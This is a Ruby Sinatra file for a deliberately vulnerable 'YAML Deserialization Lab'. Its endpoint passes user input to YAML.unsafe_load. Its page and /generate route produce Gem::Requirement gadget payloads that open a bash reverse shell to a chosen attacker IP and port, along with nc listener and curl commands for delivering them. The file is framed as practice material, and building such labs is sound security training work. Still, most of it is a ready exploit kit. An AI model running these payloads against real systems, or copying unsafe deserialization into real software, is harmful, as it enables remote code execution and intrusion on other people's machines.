require 'sinatra'
require 'json'
require 'yaml'

set :bind, '0.0.0.0'
set :port, 4567

HTML_TEMPLATE = <<'HTML'
<!DOCTYPE html>
<html>
<head>
    <title>Ruby YAML Deserialization Lab</title>
    <style>
        body { font-family: monospace; background: #1a1a1a; color: #ff6600; padding: 20px; }
        h1 { color: #ff0066; }
        h2 { color: #ffff00; }
        .vuln { background: #2d2d2d; padding: 15px; margin: 10px 0; border-left: 4px solid #ff0066; }
        textarea { width: 100%; min-height: 200px; background: #0d0d0d; color: #ff6600; border: 1px solid #ff6600; padding: 10px; font-family: monospace; }
        input[type=submit] { padding: 10px 20px; background: #ff0066; color: #fff; border: none; cursor: pointer; margin-top: 10px; }
        input[type=submit]:hover { background: #ff3388; }
        pre { background: #0d0d0d; padding: 15px; overflow-x: auto; border: 1px solid #444; color: #00ff00; }
        code { background: #333; padding: 3px 6px; }
        .warning { background: #ff0000; color: #fff; padding: 10px; margin: 10px 0; }
    </style>
</head>
<body>
    <h1>Ruby YAML Deserialization Vulnerability Lab</h1>
    <div class='warning'>⚠️ DANGER: This endpoint uses YAML.unsafe_load()!</div>
    <p>Practice Ruby YAML deserialization attacks (similar to CVE-2013-0156 Rails RCE).</p>

    <h2>Submit YAML Payload:</h2>
    <div class='vuln'>
        <form action='/yaml' method='POST'>
            <label>YAML Data:</label><br>
            <textarea name='yaml' placeholder='--- &#10;test: value'>---
test: value</textarea><br>
            <input type='submit' value='Load YAML'>
        </form>
    </div>

    <h2>Generate Reverse Shell Payload:</h2>
    <div class='vuln'>
        <form action='/generate' method='GET'>
            <label>Attacker IP:</label>
            <input type='text' name='ip' value='172.28.0.2'>
            <label>Port:</label>
            <input type='text' name='port' value='4444'>
            <input type='submit' value='Generate'>
        </form>
    </div>

    <h2>Common YAML Gadgets for RCE:</h2>

    <h3>1. Gem::Requirement (CVE-2013-0156 style):</h3>
    <pre>
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/hash:WithDefaults
  foo: |-
    bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
    </pre>

    <h2>How to Exploit:</h2>
    <pre>
# 1. Generate payload (copy from /generate)
# 2. Start listener: nc -lvnp 4444
# 3. Send payload:
curl -X POST http://target:4567/yaml -d "$(cat payload.yaml)"
    </pre>
</body>
</html>
HTML

get '/' do
  HTML_TEMPLATE
end

post '/yaml' do
  yaml_data = params['yaml']

  if yaml_data.nil? || yaml_data.empty?
    return HTML_TEMPLATE
  end

  begin
    obj = YAML.unsafe_load(yaml_data)

    result = "<div class='vuln'>"
    result += "<h2>YAML Loaded Successfully!</h2>"
    result += "<p>Type: #{obj.class}</p>"
    result += "<p>Value: #{obj.inspect rescue 'N/A'}</p>"
    result += "</div>"

    HTML_TEMPLATE.sub('<h2>Submit YAML Payload:</h2>', result + '<h2>Submit YAML Payload:</h2>')
  rescue => e
    error = "<div class='vuln' style='border-color: red;'>"
    error += "<h2>Error:</h2>"
    error += "<pre>#{e.message}\n\n#{e.backtrace.join("\n")}</pre>"
    error += "</div>"
    HTML_TEMPLATE.sub('<h2>Submit YAML Payload:</h2>', error + '<h2>Submit YAML Payload:</h2>')
  end
end

get '/generate' do
  ip = params['ip'] || '172.28.0.2'
  port = params['port'] || '4444'

  payload = <<~YAML
  --- !ruby/object:Gem::Requirement
  requirements:
    !ruby/hash:WithDefaults
    foo: |-
      bash -c 'bash -i >& /dev/tcp/#{ip}/#{port} 0>&1'

  YAML

  curl_cmd = "curl -X POST http://target:4567/yaml --data-urlencode \"yaml=$(cat payload.yaml)\""

  result = "<div class='vuln'>"
  result += "<h2>Generated Payloads for #{ip}:#{port}</h2>"
  result += "<h3>Payload: Gem::Requirement</h3>"
  result += "<pre>#{payload}</pre>"
  result += "<h3>Test Command:</h3>"
  result += "<pre>#{curl_cmd}</pre>"
  result += "</div>"

  HTML_TEMPLATE.sub('<h2>Generate Reverse Shell Payload:</h2>', result + '<h2>Generate Reverse Shell Payload:</h2>')
end

get '/api/info' do
  content_type :json
  {
    service: "Ruby YAML Deserialization Lab",
    ruby_version: RUBY_VERSION,
    endpoints: {
      "POST /yaml" => "Load YAML with unsafe_load",
      "GET /generate" => "Generate reverse shell payloads"
    }
  }.to_json
end
